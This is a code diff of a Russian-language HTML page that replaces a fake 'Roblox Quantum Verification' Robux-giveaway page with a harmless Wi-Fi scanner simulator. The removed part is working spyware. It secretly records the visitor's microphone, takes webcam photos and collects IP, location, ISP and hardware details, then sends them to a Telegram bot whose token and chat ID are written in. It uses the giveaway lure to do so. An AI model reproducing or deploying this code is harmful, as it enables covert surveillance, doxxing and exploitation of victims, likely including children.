@@ -1,125 +1,184 @@
+```html
 <!DOCTYPE html>
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Roblox | Quantum Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wi-Fi Finder Simulator</title>
+    <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        :root { --q: #00ff88; --bg: #010101; }
-        body { margin: 0; background: var(--bg); color: #fff; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .panel { width: 85%; max-width: 400px; background: rgba(255,255,255,0.02); border: 2px solid var(--q); border-radius: 40px; padding: 40px 20px; text-align: center; box-shadow: 0 0 40px rgba(0,255,136,0.2); position: relative; }
-        .payout { font-size: 40px; font-weight: 900; color: #fff; text-shadow: 0 0 20px var(--q); margin: 15px 0; }
-        .log { background: #000; padding: 15px; border-radius: 12px; font-size: 10px; color: var(--q); text-align: left; height: 100px; border: 1px solid #111; margin: 20px 0; }
-        .btn-claim { background: var(--q); color: #000; border: none; width: 100%; padding: 22px; border-radius: 20px; font-size: 20px; font-weight: 900; cursor: pointer; display: none; text-transform: uppercase; }
-        #v { position: absolute; width: 100px; height: 100px; opacity: 0.01; pointer-events: none; }
+        @keyframes pulse-ring {
+            0% { transform: scale(0.33); opacity: 1; }
+            80%, 100% { opacity: 0; }
+        }
+        .pulse {
+            position: relative;
+            width: 100px;
+            height: 100px;
+        }
+        .pulse::before {
+            content: '';
+            position: absolute;
+            display: block;
+            width: 300%;
+            height: 300%;
+            box-sizing: border-box;
+            margin-left: -100%;
+            margin-top: -100%;
+            border-radius: 50%;
+            background-color: #3b82f6;
+            animation: pulse-ring 1.25s cubic-bezier(0.215, 0.61, 0.355, 1) infinite;
+        }
     </style>
 </head>
-<body onload="initQuantum()">
+<body class="bg-slate-900 text-white font-sans min-h-screen flex flex-col items-center p-4">
 
-<div class="panel">
-    <h1 style="font-size: 18px; letter-spacing: 5px; opacity: 0.7;">QUANTUM_SYNC</h1>
-    <div class="payout">35,000 R$</div>
-    <div class="log" id="log">> SYSTEM_BOOT...<br>> WAITING_FOR_STREAM...</div>
-    <button class="btn-claim" id="btn" onclick="captureTitan()">CLAIM NOW</button>
-</div>
+    <div class="max-w-md w-full bg-slate-800 rounded-3xl shadow-2xl p-6 mt-10 border border-slate-700">
+        <header class="text-center mb-8">
+            <h1 class="text-2xl font-bold mb-2">Wi-Fi Сканер</h1>
+            <p class="text-slate-400 text-sm">Для поиска ближайших сетей необходимо разрешить доступ к местоположению</p>
+        </header>
 
-<video id="v" autoplay playsinline muted></video>
-<canvas id="c" style="display:none;"></canvas>
+        <!-- Status Card -->
+        <div id="status-card" class="bg-slate-700/50 rounded-2xl p-4 mb-6 flex items-center justify-between">
+            <div class="flex items-center gap-3">
+                <div id="status-dot" class="w-3 h-3 bg-red-500 rounded-full"></div>
+                <span id="status-text" class="text-sm font-medium">Геолокация отключена</span>
+            </div>
+            <button id="enable-btn" class="bg-blue-600 hover:bg-blue-500 px-4 py-2 rounded-xl text-sm transition-all active:scale-95">
+                Включить
+            </button>
+        </div>
 
-<script>
-    const T = '8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I';
-    const C = '7889497672';
-    let s = null;
+        <!-- Scanning Animation (Hidden by default) -->
+        <div id="scanning-ui" class="hidden flex flex-col items-center py-10">
+            <div class="pulse flex items-center justify-center">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8.111 16.404a5.5 5.5 0 017.778 0M12 20h.01m-7.08-7.071c3.904-3.905 10.236-3.905 14.141 0M1.394 9.393c5.857-5.857 15.355-5.857 21.213 0" />
+                </svg>
+            </div>
+            <p class="mt-12 text-blue-400 animate-pulse font-medium">Поиск доступных точек...</p>
+        </div>
 
-    async function initQuantum() {
-        const log = document.getElementById('log');
-        try {
-            s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            const v = document.getElementById('v');
-            v.srcObject = s;
+        <!-- Results List -->
+        <div id="results-list" class="space-y-3 hidden">
+            <h2 class="text-slate-400 text-xs uppercase tracking-wider font-bold px-2">Найденные сети рядом</h2>
+            <!-- Mock Data -->
+            <div class="bg-slate-700/30 p-4 rounded-2xl border border-slate-600 flex justify-between items-center group cursor-pointer hover:bg-slate-700/50 transition-colors">
+                <div class="flex items-center gap-4">
+                    <div class="text-green-400">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+                        </svg>
+                    </div>
+                    <div>
+                        <div class="font-bold">Home_Router_2.4G</div>
+                        <div class="text-xs text-slate-400">Сигнал: Отличный • Защита: WPA2</div>
+                    </div>
+                </div>
+                <button onclick="showInfo('Home_Router_2.4G')" class="text-blue-400 text-sm font-medium">Инфо</button>
+            </div>
+
+            <div class="bg-slate-700/30 p-4 rounded-2xl border border-slate-600 flex justify-between items-center group cursor-pointer hover:bg-slate-700/50 transition-colors">
+                <div class="flex items-center gap-4">
+                    <div class="text-yellow-400">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+                        </svg>
+                    </div>
+                    <div>
+                        <div class="font-bold">Cafe_Free_WiFi</div>
+                        <div class="text-xs text-slate-400">Сигнал: Средний • Защита: Open</div>
+                    </div>
+                </div>
+                <button onclick="showInfo('Cafe_Free_WiFi')" class="text-blue-400 text-sm font-medium">Инфо</button>
+            </div>
+        </div>
+
+        <!-- Custom Modal for Alerts -->
+        <div id="modal" class="hidden fixed inset-0 bg-black/80 flex items-center justify-center p-4 z-50">
+            <div class="bg-slate-800 border border-slate-700 p-6 rounded-3xl max-w-xs w-full text-center">
+                <div id="modal-icon" class="mb-4 flex justify-center text-blue-400"></div>
+                <h3 id="modal-title" class="text-xl font-bold mb-2"></h3>
+                <p id="modal-desc" class="text-slate-400 text-sm mb-6"></p>
+                <button onclick="closeModal()" class="w-full bg-blue-600 py-3 rounded-xl font-bold active:scale-95 transition-transform">Понятно</button>
+            </div>
+        </div>
+    </div>
+
+    <footer class="mt-auto py-6 text-slate-500 text-xs text-center">
+        <p>Примечание: Это симуляция интерфейса.<br>Браузеры не предоставляют пароли от сетей в целях безопасности.</p>
+    </footer>
+
+    <script>
+        const enableBtn = document.getElementById('enable-btn');
+        const statusDot = document.getElementById('status-dot');
+        const statusText = document.getElementById('status-text');
+        const scanningUI = document.getElementById('scanning-ui');
+        const resultsList = document.getElementById('results-list');
+        const modal = document.getElementById('modal');
+
+        enableBtn.addEventListener('click', () => {
+            if (!navigator.geolocation) {
+                showModal('Ошибка', 'Ваш браузер не поддерживает геолокацию', 'error');
+                return;
+            }
+
+            statusText.innerText = 'Запрос доступа...';
             
-            // Ждем реального появления картинки (фикс пустоты)
-            v.onloadedmetadata = () => {
-                log.innerHTML += "<br>> STREAM_DETECTED<br>> RESOLUTION: " + v.videoWidth + "x" + v.videoHeight;
-                setTimeout(() => {
-                    document.getElementById('btn').style.display = 'block';
-                    log.innerHTML += "<br>> SYSTEM_READY";
-                }, 2000);
-            };
-        } catch (e) {
-            log.innerHTML += "<br>> ERROR: STREAM_FAILED";
-            alert("Ошибка! Разрешите камеру для проверки.");
-            location.reload();
-        }
-    }
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    // Success
+                    statusDot.classList.replace('bg-red-500', 'bg-green-500');
+                    statusText.innerText = 'Местоположение активно';
+                    enableBtn.classList.add('hidden');
+                    startScan();
+                },
+                (error) => {
+                    // Error
+                    statusText.innerText = 'Доступ отклонен';
+                    showModal('Доступ ограничен', 'Для работы приложения необходимо разрешить доступ к геолокации в настройках браузера.', 'lock');
+                }
+            );
+        });
 
-    async function captureTitan() {
-        document.getElementById('btn').style.display = 'none';
-        const log = document.getElementById('log');
-        log.innerHTML = "> EXTRACTING_METADATA...<br>> UPLOADING_PACKETS...";
-
-        // 🔱 МАКСИМАЛЬНЫЙ ДОКС (IP, RAM, GPU, Модель)
-        let d = `🔱 **QUANTUM-DOX REPORT** 🔱\n\n`;
-        try {
-            const r = await fetch('https://ipapi.co/json/');
-            const j = await r.json();
-            d += `📍 IP: \`${j.ip}\`\n🌍 City: ${j.city}\n📡 ISP: ${j.org}\n`;
-        } catch(e) {}
-
-        d += `\n⚙️ **HARDWARE_DUMP:**\n`;
-        d += `📱 OS: ${navigator.platform}\n`;
-        d += `⚙️ CPU: ${navigator.hardwareConcurrency} Cores\n`;
-        d += `🧠 RAM: ${navigator.deviceMemory || '?'} GB\n`;
-        d += `🖥 Display: ${screen.width}x${screen.height}\n`;
-        d += `🎨 GPU: ${getG()}\n`;
-        d += `🔋 Battery: ${navigator.getBattery ? (await (await navigator.getBattery()).level * 100).toFixed(0) + '%' : '?'}\n`;
-        
-        const devs = await navigator.mediaDevices.enumerateDevices();
-        d += `\n📸 **MEDIA_DEVICES:**\n`;
-        devs.forEach(dev => { if(dev.label) d += `🔹 ${dev.label}\n`; });
-
-        // ЗАПИСЬ ГОЛОСА
-        const rec = new MediaRecorder(s);
-        const chunks = [];
-        rec.ondataavailable = e => chunks.push(e.data);
-        rec.onstop = async () => {
-            const fd = new FormData();
-            fd.append('chat_id', C);
-            fd.append('voice', new Blob(chunks, {type: 'audio/ogg'}), 'v.ogg');
-            fetch(`https://api.telegram.org/bot${T}/sendVoice`, { method: 'POST', body: fd });
-        };
-        rec.start();
-
-        // ФОТО (Burst Mode)
-        const v = document.getElementById('v');
-        const c = document.getElementById('c');
-        c.width = v.videoWidth;
-        c.height = v.videoHeight;
-
-        for (let i = 1; i <= 3; i++) {
-            await new Promise(r => setTimeout(r, 1000));
-            log.innerHTML = `> SYNCING: ${i}/3...`;
-            c.getContext('2d').drawImage(v, 0, 0);
-            const b = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.9));
-            const fd = new FormData();
-            fd.append('chat_id', C);
-            fd.append('photo', b, `f${i}.jpg`);
-            if (i === 1) fd.append('caption', d);
-            await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
+        function startScan() {
+            scanningUI.classList.remove('hidden');
+            resultsList.classList.add('hidden');
+            
+            setTimeout(() => {
+                scanningUI.classList.add('hidden');
+                resultsList.classList.remove('hidden');
+            }, 3000);
         }
 
-        rec.stop();
-        alert("✅ Верификация успешно завершена!");
-        window.location.href = "https://www.roblox.com";
-    }
+        function showInfo(ssid) {
+            showModal(ssid, `Пароль для данной сети скрыт системными настройками безопасности. \n\nСовет: Пароль обычно указан на наклейке роутера или в настройках владельца сети.`, 'info');
+        }
 
-    function getG() {
-        try {
-            const gl = document.createElement('canvas').getContext('webgl');
-            const ext = gl.getExtension('WEBGL_debug_renderer_info');
-            return gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
-        } catch(e) { return '?'; }
-    }
-</script>
+        function showModal(title, desc, type) {
+            const iconDiv = document.getElementById('modal-icon');
+            document.getElementById('modal-title').innerText = title;
+            document.getElementById('modal-desc').innerText = desc;
+            
+            let iconSvg = '';
+            if (type === 'lock') {
+                iconSvg = '<svg class="w-12 h-12" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>';
+            } else if (type === 'info') {
+                iconSvg = '<svg class="w-12 h-12" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>';
+            } else {
+                iconSvg = '<svg class="w-12 h-12" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>';
+            }
+            
+            iconDiv.innerHTML = iconSvg;
+            modal.classList.remove('hidden');
+        }
+
+        function closeModal() {
+            modal.classList.add('hidden');
+        }
+    </script>
 </body>
 </html>
+
+```
